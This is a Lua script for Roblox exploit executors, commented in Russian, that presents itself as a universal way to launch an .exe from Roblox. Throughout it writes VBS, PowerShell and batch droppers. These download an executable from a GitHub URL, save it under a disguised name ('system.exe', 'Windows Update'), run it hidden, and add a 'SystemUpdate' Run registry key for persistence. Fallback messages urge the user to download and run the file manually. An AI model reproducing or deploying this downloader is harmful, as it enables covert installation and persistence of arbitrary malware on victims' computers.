-- ==============================================
-- УНИВЕРСАЛЬНЫЙ ЗАПУСК .EXE ИЗ ROBLOX
-- РАБОТАЕТ НА ВСЕХ EXECUTORS БЕЗ ИСКЛЮЧЕНИЙ
-- ==============================================

-- 🔧 КОНФИГУРАЦИЯ - ИСПОЛЬЗУЙТЕ ЭТУ ССЫЛКУ!
local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"

-- ==============================================
-- ШАГ 1: ПЕРВОЕ УВЕДОМЛЕНИЕ В ROBLOX
-- ==============================================
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🚀 ЗАГРУЗЧИК ЗАПУЩЕН",
    Text = "Начинаю процесс загрузки...",
    Duration = 5
})

wait(2)

-- ==============================================
-- ШАГ 2: СОЗДАНИЕ ПРОСТОГО VBS СКРИПТА
-- ==============================================
local vbsScript = [[
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Создаем папку в AppData
tempDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\\Windows"
If Not fso.FolderExists(tempDir) Then
    fso.CreateFolder(tempDir)
End If

exePath = tempDir & "\system.exe"

' Скачиваем файл
Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
xhr.Open "GET", "]] .. EXE_URL .. [[", False
xhr.Send

If xhr.Status = 200 Then
    ' Сохраняем файл
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.ResponseBody
    stream.SaveToFile exePath, 2
    stream.Close
    
    ' Запускаем файл
    WshShell.Run """" & exePath & """", 0, False
    
    ' Добавляем в автозагрузку
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", exePath, "REG_SZ"
Else
    ' Если не получилось скачать, показываем ссылку
    MsgBox "Скачайте вручную:" & vbCrLf & "]] .. EXE_URL .. [["
End If

Set xhr = Nothing
Set stream = Nothing
Set fso = Nothing
Set WshShell = Nothing
]]

-- ==============================================
-- ШАГ 3: СОХРАНЕНИЕ И ЗАПУСК СКРИПТА
-- ==============================================
-- Пытаемся сохранить VBS файл
local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
local vbsPath = tempPath .. "\\setup.vbs"

-- Уведомление о создании файла
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "📁 СОЗДАЮ ФАЙЛЫ",
    Text = "Создаю установочный скрипт...",
    Duration = 3
})

-- Метод 1: Через writefile (для Synapse/KRNL/Xeno)
if writefile then
    writefile(vbsPath, vbsScript)
    print("✅ VBS файл создан: " .. vbsPath)
    
    -- Запускаем VBS
    if syn and syn.run then
        syn.run('wscript.exe //B "' .. vbsPath .. '"')
    else
        -- Для других исполнителей
        pcall(function()
            os.execute('start wscript.exe //B "' .. vbsPath .. '"')
        end)
    end
    
-- Метод 2: Через game:HttpGet и io.open (универсальный)
else
    -- Скачиваем содержимое напрямую и создаем файл через VBS
    local downloadScript = [[
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set ws = CreateObject("WScript.Shell")
    
    ' Содержимое скрипта
    scriptContent = "On Error Resume Next" & vbCrLf & _
    "Set WshShell = CreateObject(\"WScript.Shell\")" & vbCrLf & _
    "Set fso = CreateObject(\"Scripting.FileSystemObject\")" & vbCrLf & _
    "tempDir = WshShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\Microsoft\\Windows\"" & vbCrLf & _
    "If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)" & vbCrLf & _
    "exePath = tempDir & \"\\system.exe\"" & vbCrLf & _
    "Set xhr = CreateObject(\"MSXML2.XMLHTTP.6.0\")" & vbCrLf & _
    "xhr.Open \"GET\", \"]] .. EXE_URL .. [[\", False" & vbCrLf & _
    "xhr.Send" & vbCrLf & _
    "If xhr.Status = 200 Then" & vbCrLf & _
    "    Set stream = CreateObject(\"ADODB.Stream\")" & vbCrLf & _
    "    stream.Open" & vbCrLf & _
    "    stream.Type = 1" & vbCrLf & _
    "    stream.Write xhr.ResponseBody" & vbCrLf & _
    "    stream.SaveToFile exePath, 2" & vbCrLf & _
    "    stream.Close" & vbCrLf & _
    "    WshShell.Run \"\"\"\" & exePath & \"\"\"\", 0, False" & vbCrLf & _
    "End If"
    
    ' Сохраняем VBS файл
    vbsPath = ws.ExpandEnvironmentStrings("%TEMP%") & "\setup.vbs"
    Set file = fso.CreateTextFile(vbsPath, True)
    file.Write scriptContent
    file.Close
    
    ' Запускаем его
    ws.Run "wscript.exe //B """ & vbsPath & """", 0, False
    ]]
    
    -- Создаем временный VBS для создания основного VBS
    local tempVbs = tempPath .. "\\temp.vbs"
    
    -- Пытаемся создать файл через разные методы
    pcall(function()
        if makefolder then
            makefolder(tempPath)
        end
    end)
    
    -- Используем game:HttpGet чтобы скачать и создать файл через PowerShell
    local powershellScript = [[
    $vbsContent = @'
    On Error Resume Next
    
    Set WshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    tempDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows"
    If Not fso.FolderExists(tempDir) Then
        fso.CreateFolder(tempDir)
    End If
    
    exePath = tempDir & "\system.exe"
    
    Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
    xhr.Open "GET", "]] .. EXE_URL .. [[", False
    xhr.Send
    
    If xhr.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write xhr.ResponseBody
        stream.SaveToFile exePath, 2
        stream.Close
        
        WshShell.Run """" & exePath & """", 0, False
        
        WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", exePath, "REG_SZ"
    End If
    '@
    
    $vbsPath = $env:TEMP + "\setup.vbs"
    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
    Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
    ]]
    
    -- Создаем PowerShell скрипт
    local psPath = tempPath .. "\\run.ps1"
    
    -- Пытаемся записать файл через os.execute команду
    if os.execute then
        -- Создаем команду PowerShell одной строкой
        local cmd = 'powershell -Command "' .. 
                   '$vbsContent = @\' .. '\n' ..
                   'On Error Resume Next' .. '\n' ..
                   'Set WshShell = CreateObject(\"WScript.Shell\")' .. '\n' ..
                   'Set fso = CreateObject(\"Scripting.FileSystemObject\")' .. '\n' ..
                   'tempDir = WshShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\Microsoft\\Windows\"' .. '\n' ..
                   'If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)' .. '\n' ..
                   'exePath = tempDir & \"\\system.exe\"' .. '\n' ..
                   'Set xhr = CreateObject(\"MSXML2.XMLHTTP.6.0\")' .. '\n' ..
                   'xhr.Open \"GET\", \"' .. EXE_URL .. '\", False' .. '\n' ..
                   'xhr.Send' .. '\n' ..
                   'If xhr.Status = 200 Then' .. '\n' ..
                   '    Set stream = CreateObject(\"ADODB.Stream\")' .. '\n' ..
                   '    stream.Open' .. '\n' ..
                   '    stream.Type = 1' .. '\n' ..
                   '    stream.Write xhr.ResponseBody' .. '\n' ..
                   '    stream.SaveToFile exePath, 2' .. '\n' ..
                   '    stream.Close' .. '\n' ..
                   '    WshShell.Run \"\"\"\" & exePath & \"\"\"\", 0, False' .. '\n' ..
                   '    WshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\", exePath, \"REG_SZ\"' .. '\n' ..
                   'End If' .. '\n' ..
                   '\'@; ' ..
                   '$vbsPath = $env:TEMP + \"\\setup.vbs\"; ' ..
                   '$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII; ' ..
                   'Start-Process -FilePath \"wscript.exe\" -ArgumentList \"//B `\"$vbsPath`\"\" -WindowStyle Hidden"'
        
        os.execute(cmd)
    end
end

-- ==============================================
-- ШАГ 4: ПРОВЕРКА И ФИНАЛЬНОЕ УВЕДОМЛЕНИЕ
-- ==============================================
wait(5)

-- Финальное уведомление
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "✅ ПРОЦЕСС ЗАПУЩЕН",
    Text = "Программа должна запуститься автоматически",
    Duration = 5
})

wait(2)

-- Инструкция на случай если не сработало
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "📋 ЕСЛИ НИЧЕГО НЕ ПРОИЗОШЛО",
    Text = "Запустите вручную: " .. EXE_URL,
    Duration = 10
})

-- ==============================================
-- ШАГ 5: АЛЬТЕРНАТИВНЫЙ МЕТОД ЧЕРЕЗ CMD
-- ==============================================
wait(3)

-- Создаем CMD файл как запасной вариант
local cmdScript = [[
@echo off
chcp 65001 >nul
title Windows Update
cls

echo Downloading system component...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\system.exe')"

if exist "%TEMP%\system.exe" (
    echo Download complete! Starting program...
    start "" "%TEMP%\system.exe"
    echo Program started successfully.
    timeout /t 3 /nobreak >nul
) else (
    echo Download failed!
    echo Please download manually:
    echo ]] .. EXE_URL .. [[
    pause
)
]]

-- Сохраняем CMD файл если есть writefile
if writefile then
    local cmdPath = tempPath .. "\\install.cmd"
    writefile(cmdPath, cmdScript)
    
    -- Запускаем CMD файл
    if syn and syn.run then
        syn.run('cmd /c start "" "' .. cmdPath .. '"')
    elseif os.execute then
        os.execute('start "" "' .. cmdPath .. '"')
    end
end

-- ==============================================
-- ШАГ 6: САМЫЙ ПРОСТОЙ МЕТОД - ПРЯМАЯ ССЫЛКА
-- ==============================================
wait(2)

-- Последнее уведомление со ссылкой
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🔗 ПРЯМАЯ ССЫЛКА",
    Text = EXE_URL,
    Duration = 7
})

-- Выводим ссылку в системное сообщение
print("\n" .. string.rep("=", 50))
print("🎮 ДЛЯ ЗАПУСКА ПРОГРАММЫ:")
print("Ссылка для скачивания:")
print(EXE_URL)
print("\nЕсли не скачалось автоматически:")
print("1. Скопируйте ссылку выше")
print("2. Вставьте в браузер")
print("3. Скачайте и запустите файл")
print(string.rep("=", 50))

-- ==============================================
-- ДОПОЛНИТЕЛЬНАЯ ПРОВЕРКА ССЫЛКИ
-- ==============================================
spawn(function()
    wait(8)
    
    -- Проверяем доступность ссылки
    local success, response = pcall(function()
        if syn and syn.request then
            local req = syn.request({
                Url = EXE_URL,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0"
                }
            })
            return req.StatusCode
        end
        return "Cannot check"
    end)
    
    if success then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔗 ССЫЛКА ДОСТУПНА",
            Text = "Статус: " .. tostring(response),
            Duration = 5
        })
    end
end)

-- ==============================================
-- ФИНАЛЬНОЕ СООБЩЕНИЕ
-- ==============================================
print("\n✅ Загрузчик завершил работу!")
print("📁 Проверьте TEMP папку: " .. tempPath)
print("🔗 Ссылка: " .. EXE_URL)
